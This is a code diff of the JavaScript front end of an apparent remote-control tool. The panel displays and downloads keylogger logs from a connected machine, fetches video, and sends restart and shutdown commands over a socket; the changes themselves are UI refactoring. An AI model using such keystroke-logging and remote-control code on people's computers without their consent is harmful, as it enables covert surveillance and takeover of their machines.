@@ -124,6 +124,7 @@ function sendSocketMessage(command, payload = null) {
 // ==========================================
 // 5. SERVER RESPONSE HANDLER
 // ==========================================
+
 function handleServerResponse(data) {
     const cmd = data.command;
     const payload = data.payload;
@@ -148,9 +149,12 @@ function handleServerResponse(data) {
             break;
 
         case "keylogger_log":
-            // Gọi hàm hiển thị kiểu Terminal Hacker
             showLogModal("Nhật ký bàn phím (Keylogger)", payload);
             break;
+
+        // NEW: Handle Info and Success messages from C++
+        case "info": showToast(payload, "info"); break;
+        case "success": showToast(payload, "success"); break;
 
         case "error": showModal("Lỗi từ Server", `<p style="color:var(--accent-red); font-weight:bold;">${payload}</p>`); break;
         default: console.log("Unhandled command:", data); break;
@@ -158,8 +162,9 @@ function handleServerResponse(data) {
 }
 
 // ==========================================
-// 6. MODAL & DOWNLOAD LOGIC (FULL UPGRADE)
+// 6. MODAL & DOWNLOAD LOGIC 
 // ==========================================
+
 function showModal(title, htmlContent) {
     modalTitle.innerText = title;
     modalBody.innerHTML = htmlContent;
@@ -201,11 +206,11 @@ function showVideoModal(title, url) {
     setupDownloadLink(url, `video_${Date.now()}.mp4`);
 }
 
-// --- HÀM KEYLOGGER TERMINAL STYLE ---
+// --- HÀM KEYLOGGER ---
 function showLogModal(title, logContent) {
     if (!logContent) logContent = "Log trống hoặc chưa có dữ liệu.";
 
-    // Tô màu (Syntax Highlighting)
+    // Syntax Highlighting
     let formattedHtml = logContent.replace(/\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]/g, 
         '<span class="log-timestamp">[$1]</span>');
     formattedHtml = formattedHtml.replace(/\[(?!(\d{4}))([^\]]+)\]/g, 
@@ -224,7 +229,7 @@ function showLogModal(title, logContent) {
     setupDownloadLink(url, `keylog_${Date.now()}.txt`);
 }
 
-// --- HÀM TẢI XUỐNG THÔNG MINH (FIX LỖI NÚT BIẾN MẤT & MỞ TAB MỚI) ---
+// --- HÀM TẢI XUỐNG ---
 function setupDownloadLink(url, filename) {
     // 1. Luôn lấy nút hiện tại đang nằm trên DOM
     const currentBtn = document.getElementById("download-link");
@@ -332,24 +337,30 @@ document.getElementById("btn-send-message").onclick = () => {
     } 
 };
 
-// --- XỬ LÝ NÚT TẮT MÁY (GIAO DIỆN HACKER MỚI) ---
-document.getElementById("btn-shutdown").onclick = () => { 
-    const html = `
-        <div style="text-align: center; padding: 20px;">
-            <i class="fa-solid fa-triangle-exclamation fa-4x" style="color: var(--accent-red); margin-bottom: 20px; animation: pulse 1s infinite;"></i>
-            <h3 style="color: #fff; font-size: 1.2rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px;">Xác nhận tắt hệ thống?</h3>
-            <p style="color: var(--text-secondary); margin-bottom: 30px; line-height: 1.5;">
-                Hành động này sẽ tắt nguồn máy tính Server ngay lập tức.<br>
-                Bạn sẽ mất kết nối hoàn toàn.
-            </p>
-            <div style="display: flex; justify-content: center; gap: 15px;">
-                <button id="btn-confirm-cancel" class="btn-neutral" style="padding: 10px 25px;"><i class="fa-solid fa-xmark"></i> Hủy bỏ</button>
-                <button id="btn-confirm-ok" class="btn-danger" style="padding: 10px 25px; box-shadow: 0 0 15px var(--accent-red);"><i class="fa-solid fa-power-off"></i> TẮT NGAY</button>
-            </div>
-        </div>
-    `;
+// --- RESTART BUTTON LOGIC  ---
+document.getElementById("btn-restart").onclick = () => { 
+    const htmlContent = document.getElementById("tpl-restart").innerHTML;
+    showModal("⚠️ XÁC NHẬN RESTART", htmlContent);
 
-    showModal("⚠️ CẢNH BÁO NGUY HIỂM", html);
+    document.getElementById("btn-restart-cancel").onclick = () => {
+        resultModal.classList.add("hidden");
+    };
+
+    document.getElementById("btn-restart-ok").onclick = () => {
+        sendSocketMessage("restart");
+        resultModal.classList.add("hidden");
+        showToast("Đã gửi lệnh: Khởi động lại hệ thống!", "warning");
+        setTimeout(() => {
+            if(socket) socket.close();
+            showLoginView("Server đang khởi động lại...", true);
+        }, 2000);
+    };
+};
+
+// --- SHUTDOWN LOGIC  ---
+document.getElementById("btn-shutdown").onclick = () => { 
+    const htmlContent = document.getElementById("tpl-shutdown").innerHTML;
+    showModal("⚠️ CẢNH BÁO NGUY HIỂM", htmlContent);
 
     document.getElementById("btn-confirm-cancel").onclick = () => {
         resultModal.classList.add("hidden");
